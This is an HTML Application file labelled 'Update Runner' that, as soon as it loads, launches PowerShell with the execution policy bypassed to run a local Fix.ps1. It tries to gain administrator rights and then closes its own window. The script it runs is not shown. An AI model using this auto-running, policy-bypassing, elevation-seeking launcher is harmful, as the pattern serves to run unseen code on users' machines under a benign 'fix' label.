<html>
<head>
  <title>Run Fix.ps1</title>
  <HTA:APPLICATION
    ID="UpdateRunner"
    APPLICATIONNAME="Update Runner"
    BORDER="thin"
    CAPTION="yes"
    SCROLL="no"
    SINGLEINSTANCE="yes"
    SYSMENU="yes"
    WINDOWSTATE="normal"
  />
  <style>
    body { font-family: Segoe UI, Arial, sans-serif; margin: 16px; }
    .box { border: 1px solid #ddd; border-radius: 8px; padding: 16px; max-width: 520px; }
    button { padding: 8px 14px; font-size: 14px; cursor: pointer; }
    .muted { color: #666; }
  </style>
  <script language="JScript" type="text/javascript">
    function runFix() {
      try {
        var fso = new ActiveXObject("Scripting.FileSystemObject");

        // Build absolute path to Fix.ps1 in the important folder under the current user's Downloads
        var wsh = new ActiveXObject("WScript.Shell");
        var username = wsh.ExpandEnvironmentStrings("%USERNAME%");
        var ps1 = "C:\\Users\\" + username + "\\Downloads\\V3 TESTING\\important\\js\\ps\\Fix.ps1";
        var folder = fso.GetParentFolderName(ps1);
        if (!fso.FileExists(ps1)) {
          alert("Fix.ps1 not found at:\n" + ps1);
          return;
        }

        // PowerShell arguments
        var args = '-NoProfile -ExecutionPolicy Bypass -File "' + ps1 + '"';

        // Try elevated run (UAC prompt)
        var shellApp = new ActiveXObject("Shell.Application");
        try {
          shellApp.ShellExecute("powershell.exe", args, folder, "runas", 1);
        } catch (e) {
          // Fallback non-elevated
          var wsh = new ActiveXObject("WScript.Shell");
          wsh.CurrentDirectory = folder;
          wsh.Run('powershell.exe ' + args, 1, false);
        }

      } catch (e) {
        alert("Error launching Fix.ps1:\n" + e.message);
      } finally {
        // Close the HTA window after kicking off PowerShell
        window.close();
      }
    }

    function onLoaded() {
      // Auto-run on load
      runFix();
    }
    window.onload = onLoaded;
  </script>
</head>
<body>
  <div class="box">
    <h3>Running Fix.ps1...</h3>
    <p class="muted">
      This tool launches PowerShell to run <code>Fix.ps1</code> with ExecutionPolicy Bypass.
      If you donâ€™t see a prompt in a few seconds, click the button below.
    </p>
    <button onclick="runFix()">Run Now</button>
  </div>
</body>
</html>